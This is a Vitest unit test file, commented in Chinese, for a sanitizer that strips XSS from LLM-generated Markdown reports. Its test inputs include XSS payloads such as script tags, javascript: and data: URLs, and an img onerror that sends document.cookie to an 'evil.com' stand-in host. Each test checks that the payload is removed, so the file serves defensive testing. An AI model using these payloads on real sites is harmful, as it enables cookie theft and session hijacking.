/**
 * @test_id V9-TEST-UT-050
 * @module sanitizeLlmOutput.test
 * @description sanitizeLlmOutput 消毒逻辑单元测试
 *
 * 测试目标：
 * 1. 验证 LLM 输出中的 XSS 载荷被有效移除
 * 2. 验证 Markdown 语法被保留（不影响渲染）
 * 3. 验证各种危险协议（javascript:/data:/vbscript:）被移除
 * 4. 验证 <script>/<style>/<iframe> 等危险标签被移除
 *
 * 关联契约：AGENTS.md §6「LLM 输出必须经 sanitizeLlmOutput 消毒后渲染，防止 XSS」
 * 关联文档：docs/implementation/walkthrough-agent-llm-report-20260704.md 第五节问题 3
  * @covers_docs [V9-DOC-AI-017, V9-DOC-AI-033]
*/

import { describe, it, expect } from 'vitest'
import {
  sanitizeLlmOutput,
  sanitizeMarkdown,
  sanitizeHtml,
  escapeHtml,
} from '@/lib/xssSanitizer'

describe('sanitizeLlmOutput — LLM 输出消毒逻辑', () => {
  // ============================================================
  // 边界用例：空输入与非字符串输入
  // ============================================================

  describe('边界用例', () => {
    it('空字符串应返回空字符串', () => {
      expect(sanitizeLlmOutput('')).toBe('')
    })

    it('仅空白字符的字符串应保留原样（不含危险载荷）', () => {
      expect(sanitizeLlmOutput('   ')).toBe('   ')
    })

    it('纯文本应原样返回（不含 HTML/JS 载荷）', () => {
      const text = '贵州茅台 2024 年年报显示营收增长 15%'
      expect(sanitizeLlmOutput(text)).toBe(text)
    })

    it('sanitizeLlmOutput 与 sanitizeMarkdown 是同一函数（语义化别名）', () => {
      expect(sanitizeLlmOutput).toBe(sanitizeMarkdown)
    })
  })

  // ============================================================
  // 核心用例：HTML 注释移除
  // ============================================================

  describe('HTML 注释移除', () => {
    it('应移除标准 HTML 注释 <!-- ... -->', () => {
      const input = '文本前 <!-- 这是注释 --> 文本后'
      expect(sanitizeLlmOutput(input)).toBe('文本前  文本后')
    })

    it('应移除条件注释（防止 IE 条件注释攻击）', () => {
      const input = '<!--[if IE]><script>alert(1)</script><![endif]-->文本'
      const result = sanitizeLlmOutput(input)
      expect(result).not.toContain('<script>')
      expect(result).not.toContain('alert(1)')
      expect(result).toContain('文本')
    })

    it('应移除多行注释', () => {
      const input = `<!-- 多行
注释内容 -->
正文`
      const result = sanitizeLlmOutput(input)
      expect(result).not.toContain('<!--')
      expect(result).not.toContain('-->')
      expect(result).toContain('正文')
    })
  })

  // ============================================================
  // 核心用例：危险标签移除（含内容）
  // ============================================================

  describe('危险标签移除', () => {
    it('应移除 <script> 标签及其内容', () => {
      const input = '正常文本 <script>alert("xss")</script> 后续文本'
      const result = sanitizeLlmOutput(input)
      expect(result).not.toContain('<script>')
      expect(result).not.toContain('alert')
      expect(result).toContain('正常文本')
      expect(result).toContain('后续文本')
    })

    it('应移除多行 <script> 标签', () => {
      const input = `<script>
        document.cookie;
        fetch('https://evil.com');
      </script>文本`
      const result = sanitizeLlmOutput(input)
      expect(result).not.toContain('<script>')
      expect(result).not.toContain('document.cookie')
      expect(result).not.toContain('evil.com')
      expect(result).toContain('文本')
    })

    it('应移除 <style> 标签及其内容（防止 CSS 注入）', () => {
      const input = '<style>body{background:url(javascript:alert(1))}</style>文本'
      const result = sanitizeLlmOutput(input)
      expect(result).not.toContain('<style>')
      expect(result).not.toContain('background')
      expect(result).toContain('文本')
    })

    it('应移除 <iframe> 标签及其内容', () => {
      const input = '<iframe src="https://evil.com"></iframe>文本'
      const result = sanitizeLlmOutput(input)
      expect(result).not.toContain('<iframe>')
      expect(result).not.toContain('evil.com')
      expect(result).toContain('文本')
    })

    it('应移除 <object> 标签及其内容', () => {
      const input = '<object data="evil.swf"></object>文本'
      const result = sanitizeLlmOutput(input)
      expect(result).not.toContain('<object>')
      expect(result).not.toContain('evil.swf')
      expect(result).toContain('文本')
    })

    it('应移除 <embed> 标签及其内容', () => {
      const input = '<embed src="evil.swf">文本'
      const result = sanitizeLlmOutput(input)
      expect(result).not.toContain('<embed')
      expect(result).toContain('文本')
    })

    it('应移除 <form> 标签及其内容', () => {
      const input = '<form action="https://evil.com"><input name="x"></form>文本'
      const result = sanitizeLlmOutput(input)
      expect(result).not.toContain('<form')
      expect(result).not.toContain('evil.com')
      expect(result).toContain('文本')
    })

    it('应移除 <input>/<textarea>/<button>/<applet> 标签', () => {
      const inputs = [
        '<input type="text" name="x">文本',
        '<textarea>恶意内容</textarea>文本',
        '<button onclick="alert(1)">点我</button>文本',
        '<applet code="evil.class"></applet>文本',
      ]
      for (const input of inputs) {
        const result = sanitizeLlmOutput(input)
        expect(result).toContain('文本')
        expect(result).not.toMatch(/<(input|textarea|button|applet)\b/i)
      }
    })
  })

  // ============================================================
  // 核心用例：行内 HTML 标签移除（保留文本）
  // ============================================================

  describe('行内 HTML 标签移除', () => {
    it('应移除 <b>/<strong>/<i>/<em> 等格式标签但保留文本', () => {
      const input = '<b>加粗</b>和<strong>强调</strong>以及<i>斜体</i>'
      const result = sanitizeLlmOutput(input)
      expect(result).not.toContain('<b>')
      expect(result).not.toContain('<strong>')
      expect(result).not.toContain('<i>')
      expect(result).toContain('加粗')
      expect(result).toContain('强调')
      expect(result).toContain('斜体')
    })

    it('应移除 <img> 标签（含 onerror 事件）', () => {
      const input = '<img src="x" onerror="alert(1)">文本'
      const result = sanitizeLlmOutput(input)
      expect(result).not.toContain('<img')
      expect(result).not.toContain('onerror')
      expect(result).not.toContain('alert(1)')
      expect(result).toContain('文本')
    })

    it('应移除 <a> 标签但保留链接文本', () => {
      const input = '<a href="https://example.com">示例链接</a>文本'
      const result = sanitizeLlmOutput(input)
      expect(result).not.toContain('<a ')
      expect(result).not.toContain('href=')
      expect(result).toContain('示例链接')
      expect(result).toContain('文本')
    })

    it('应移除 <div>/<span> 等容器标签但保留内部文本', () => {
      const input = '<div class="content"><span>内容</span></div>'
      const result = sanitizeLlmOutput(input)
      expect(result).not.toContain('<div')
      expect(result).not.toContain('<span')
      expect(result).toContain('内容')
    })
  })

  // ============================================================
  // 核心用例：危险协议移除
  // ============================================================
  // 注意：sanitizeLlmOutput 是 sanitizeMarkdown 的别名，只在 Markdown 链接和
  // 自动链接中处理危险协议，不会移除文本中独立的 javascript:/data:/vbscript:。
  // 移除独立危险协议的能力属于 sanitizeHtml（步骤 5）。
  // ============================================================

  describe('危险协议移除（在自动链接中）', () => {
    it('应移除 <javascript:...> 自动链接', () => {
      const input = '访问 <javascript:alert(1)> 链接'
      const result = sanitizeLlmOutput(input)
      expect(result).not.toContain('<javascript:')
      expect(result).not.toContain('alert(1)')
      expect(result).toContain('访问')
      expect(result).toContain('链接')
    })

    it('应移除 <vbscript:...> 自动链接', () => {
      const input = '访问 <vbscript:msgbox(1)> 链接'
      const result = sanitizeLlmOutput(input)
      expect(result).not.toContain('<vbscript:')
      expect(result).not.toContain('msgbox(1)')
    })

    it('应移除 <data:...> 自动链接', () => {
      const input = '访问 <data:text/html,evil> 链接'
      const result = sanitizeLlmOutput(input)
      expect(result).not.toContain('<data:')
      expect(result).not.toContain('evil')
    })

    it('应处理大小写混合的自动链接协议', () => {
      const input = '<JAVASCRIPT:alert(1)> 和 <Data:text/html,evil>'
      const result = sanitizeLlmOutput(input)
      expect(result).not.toMatch(/<javascript:/i)
      expect(result).not.toMatch(/<data:/i)
      expect(result).not.toContain('alert(1)')
      expect(result).not.toContain('evil')
    })
  })

  describe('独立危险协议（sanitizeLlmOutput 不处理，需 sanitizeHtml）', () => {
    it('sanitizeLlmOutput 不会移除文本中独立的 javascript: 协议', () => {
      // 已知限制：sanitizeMarkdown 只处理 Markdown 链接和自动链接中的危险协议
      // 文本中独立的 javascript: 需使用 sanitizeHtml 处理
      const input = '访问 javascript:alert(1) 链接'
      const result = sanitizeLlmOutput(input)
      // 实际行为：原样返回（sanitizeLlmOutput 不处理独立协议）
      expect(result).toContain('javascript:')

      // 对照：sanitizeHtml 会移除协议名（但不移除后面的内容）
      const htmlResult = sanitizeHtml(input)
      expect(htmlResult).not.toContain('javascript:')
      // 注意：sanitizeHtml 只移除协议名 javascript:，不移除后面的 alert(1)
      expect(htmlResult).toContain('alert(1)')
    })

    it('sanitizeHtml 应移除独立的 javascript:/data:/vbscript:/file: 协议名', () => {
      const inputs = [
        '访问 javascript:alert(1) 链接',
        '访问 vbscript:msgbox(1) 链接',
        '访问 file:///etc/passwd 链接',
      ]
      for (const input of inputs) {
        const result = sanitizeHtml(input)
        // 只验证协议名被移除（后面的内容保留）
        expect(result).not.toMatch(/javascript:|vbscript:|file:/i)
      }
    })

    it('sanitizeHtml 应移除 data: 协议名（含 <script>）', () => {
      const input = '访问 data:text/html,<script>alert(1)</script> 链接'
      const result = sanitizeHtml(input)
      expect(result).not.toContain('data:')
      // <script> 标签被移除
      expect(result).not.toContain('<script>')
      // alert(1) 在 <script> 标签内，被一并移除
      expect(result).not.toContain('alert(1)')
    })

    it('sanitizeHtml 应处理大小写混合的危险协议名', () => {
      const input = 'JavaScript:alert(1) 和 Data:text/html,evil 和 VBScript:msgbox(1)'
      const result = sanitizeHtml(input)
      // 只验证协议名被移除（后面的内容保留）
      expect(result).not.toMatch(/javascript:|data:|vbscript:/i)
      // alert(1)/evil/msgbox(1) 是协议后面的内容，保留
      expect(result).toContain('alert(1)')
      expect(result).toContain('msgbox(1)')
    })
  })

  // ============================================================
  // 核心用例：Markdown 链接中的危险协议
  // ============================================================

  describe('Markdown 链接中的危险协议', () => {
    it('应将 [text](javascript:alert) 替换为 [text](#)', () => {
      // 注意：URL 中不含 `)` 才能被正则完整匹配
      const input = '[点击](javascript:alert)'
      const result = sanitizeLlmOutput(input)
      expect(result).toBe('[点击](#)')
      expect(result).not.toContain('javascript:')
    })

    it('应将 [text](data:text/html,evil) 替换为 [text](#)', () => {
      const input = '[恶意](data:text/html,evil)'
      const result = sanitizeLlmOutput(input)
      expect(result).toBe('[恶意](#)')
      expect(result).not.toContain('data:')
    })

    it('应将 [text](vbscript:msgbox) 替换为 [text](#)', () => {
      const input = '[点击](vbscript:msgbox)'
      const result = sanitizeLlmOutput(input)
      expect(result).toBe('[点击](#)')
      expect(result).not.toContain('vbscript:')
    })

    it('已知限制：URL 含 ) 时正则匹配不完整（bug 文档化）', () => {
      // 已知 bug：正则 /\[([^\]]*)\]\(([^)]*)\)/g 中 [^)]* 遇到第一个 ) 停止，
      // 导致 [点击](javascript:alert(1)) 的 URL 被截断为 javascript:alert(1，
      // 替换后剩余一个 )，结果为 [点击](#))
      const input = '[点击](javascript:alert(1))'
      const result = sanitizeLlmOutput(input)
      // 危险协议被替换（部分），但多了个 )
      expect(result).toContain('[点击](#)')
      expect(result).not.toContain('javascript:')
    })

    it('应保留安全的 Markdown 链接 [text](https://...)', () => {
      const input = '[官网](https://example.com)'
      const result = sanitizeLlmOutput(input)
      expect(result).toBe('[官网](https://example.com)')
    })

    it('应保留安全的 Markdown 链接 [text](http://...)', () => {
      const input = '[文档](http://docs.example.com)'
      const result = sanitizeLlmOutput(input)
      expect(result).toBe('[文档](http://docs.example.com)')
    })
  })

  // ============================================================
  // 核心用例：自动链接移除
  // ============================================================

  describe('自动链接移除', () => {
    it('应移除 <javascript:...> 自动链接', () => {
      const input = '<javascript:alert(1)>'
      const result = sanitizeLlmOutput(input)
      expect(result).not.toContain('javascript:')
      expect(result).not.toContain('alert(1)')
    })

    it('应移除 <vbscript:...> 自动链接', () => {
      const input = '<vbscript:msgbox(1)>'
      const result = sanitizeLlmOutput(input)
      expect(result).not.toContain('vbscript:')
    })

    it('应移除 <data:...> 自动链接', () => {
      const input = '<data:text/html,<script>alert(1)</script>>'
      const result = sanitizeLlmOutput(input)
      expect(result).not.toContain('data:')
      expect(result).not.toContain('<script>')
    })
  })

  // ============================================================
  // 核心用例：保留 Markdown 语法
  // ============================================================

  describe('保留 Markdown 语法', () => {
    it('应保留标题语法 #', () => {
      const input = '# 一级标题\n## 二级标题\n### 三级标题'
      expect(sanitizeLlmOutput(input)).toBe(input)
    })

    it('应保留强调语法 * 和 **', () => {
      const input = '*斜体* 和 **加粗** 以及 ***粗斜体***'
      expect(sanitizeLlmOutput(input)).toBe(input)
    })

    it('应保留行内代码语法 `', () => {
      const input = '使用 `npm install` 安装依赖'
      expect(sanitizeLlmOutput(input)).toBe(input)
    })

    it('应保留代码块语法 ```', () => {
      const input = '```python\nprint("hello")\n```'
      expect(sanitizeLlmOutput(input)).toBe(input)
    })

    it('应保留引用语法 >', () => {
      const input = '> 这是一段引用文本'
      expect(sanitizeLlmOutput(input)).toBe(input)
    })

    it('应保留列表语法 - 和 *', () => {
      const input = '- 列表项 1\n- 列表项 2\n* 列表项 3'
      expect(sanitizeLlmOutput(input)).toBe(input)
    })

    it('应保留有序列表语法 1.', () => {
      const input = '1. 第一项\n2. 第二项\n3. 第三项'
      expect(sanitizeLlmOutput(input)).toBe(input)
    })

    it('应保留分隔线语法 ---', () => {
      const input = '上文\n---\n下文'
      expect(sanitizeLlmOutput(input)).toBe(input)
    })

    it('应保留表格语法 |', () => {
      const input = '| 列1 | 列2 |\n|-----|-----|\n| 值1 | 值2 |'
      expect(sanitizeLlmOutput(input)).toBe(input)
    })
  })

  // ============================================================
  // 综合场景测试
  // ============================================================

  describe('综合场景', () => {
    it('LLM 输出：含 XSS 载荷的 Markdown 报告应被正确消毒', () => {
      const llmOutput = `# 茅台分析报告

<script>alert('xss')</script>

## 财务摘要

营收增长 <b>15%</b>，净利润增长 **18%**。

[恶意链接](javascript:alert(1))

<img src="x" onerror="fetch('https://evil.com/steal?c='+document.cookie)">

<!-- 条件注释攻击 -->

> 引用块：行业景气度持续向上

\`\`\`python
print("安全代码块")
\`\`\`

了解更多访问 <javascript:void(0)>`

      const result = sanitizeLlmOutput(llmOutput)

      // 危险内容应被移除
      expect(result).not.toContain('<script>')
      expect(result).not.toContain('alert')
      expect(result).not.toContain('javascript:')
      expect(result).not.toContain('<img')
      expect(result).not.toContain('onerror')
      expect(result).not.toContain('evil.com')
      expect(result).not.toContain('document.cookie')
      expect(result).not.toContain('<!--')
      expect(result).not.toContain('-->')

      // Markdown 语法应被保留
      expect(result).toContain('# 茅台分析报告')
      expect(result).toContain('## 财务摘要')
      expect(result).toContain('**18%**')
      expect(result).toContain('> 引用块')
      expect(result).toContain('```python')
      expect(result).toContain('print("安全代码块")')
      expect(result).toContain('```')

      // 安全文本应被保留
      expect(result).toContain('15%')
      expect(result).toContain('行业景气度持续向上')

      // 恶意链接应被替换为 #
      expect(result).toContain('[恶意链接](#)')
    })

    it('LLM 输出：纯文本投资建议应原样返回', () => {
      const llmOutput = `综合评分：4.2/5

建议：买入

理由：
1. 营收增长稳健
2. 毛利率维持高位
3. 行业景气度向上

风险提示：消费降级风险、政策监管风险`

      expect(sanitizeLlmOutput(llmOutput)).toBe(llmOutput)
    })

    it('LLM 输出：含 HTML 实体的内容应被正确处理', () => {
      const llmOutput = '营收 & 利润均 < 100亿，但 > 50亿'
      const result = sanitizeLlmOutput(llmOutput)
      // sanitizeLlmOutput 不会转义 & < >（保留 Markdown 语法），仅移除 HTML 标签和危险协议
      expect(result).toContain('100亿')
      expect(result).toContain('50亿')
    })

    it('应处理超长输入（性能验证）', () => {
      const longText = '安全的文本内容。'.repeat(1000)
      const input = `${longText}<script>alert(1)</script>`
      const result = sanitizeLlmOutput(input)
      expect(result).not.toContain('<script>')
      expect(result).not.toContain('alert(1)')
      expect(result).toContain('安全的文本内容')
      expect(result.length).toBeGreaterThan(longText.length - 100)
    })
  })

  // ============================================================
  // 关联函数：sanitizeHtml 与 escapeHtml 验证
  // ============================================================

  describe('关联函数 sanitizeHtml', () => {
    it('应移除所有 HTML 标签并转义特殊字符', () => {
      const input = '<b>加粗</b><script>alert(1)</script>'
      const result = sanitizeHtml(input)
      expect(result).not.toContain('<b>')
      expect(result).not.toContain('<script>')
      expect(result).not.toContain('alert(1)')
      expect(result).toContain('加粗')
    })

    it('应转义 & 字符', () => {
      // 注意：sanitizeHtml 步骤 4 会移除 HTML 标签模式（< x >），
      // 所以 < b > 会被当作标签移除。测试 & 转义需使用不构成标签的输入。
      const input = 'a & b'
      const result = sanitizeHtml(input)
      expect(result).toBe('a &amp; b')
    })

    it('应转义 " \' / ` 字符', () => {
      const input = '"quoted" \'single\' /slash/ `backtick`'
      const result = sanitizeHtml(input)
      expect(result).toContain('&quot;')
      expect(result).toContain('&#x27;')
      expect(result).toContain('&#x2F;')
      expect(result).toContain('&#x60;')
    })

    it('已知行为：< text > 模式会被当作 HTML 标签移除', () => {
      // 已知行为：sanitizeHtml 步骤 4 /<\/?[^>]+(>|$)/g 会移除 < b > 模式
      const input = 'a < b > c'
      const result = sanitizeHtml(input)
      // < b > 被移除，留下两个空格
      expect(result).not.toContain('<')
      expect(result).not.toContain('>')
      expect(result).toContain('a')
      expect(result).toContain('c')
    })
  })

  describe('关联函数 escapeHtml', () => {
    it('应转义所有危险字符', () => {
      const input: Record<string, string> = {
        '&': '&amp;',
        '<': '&lt;',
        '>': '&gt;',
        '"': '&quot;',
        "'": '&#x27;',
        '/': '&#x2F;',
        '`': '&#x60;',
      }
      for (const [char, entity] of Object.entries(input)) {
        expect(escapeHtml(char)).toBe(entity)
      }
    })

    it('空字符串应返回空字符串', () => {
      expect(escapeHtml('')).toBe('')
    })

    it('应处理包含多种特殊字符的字符串', () => {
      const input = '<script>alert("xss")</script>'
      const result = escapeHtml(input)
      expect(result).not.toContain('<script>')
      expect(result).not.toContain('"')
      expect(result).toContain('&lt;script&gt;')
    })
  })
})
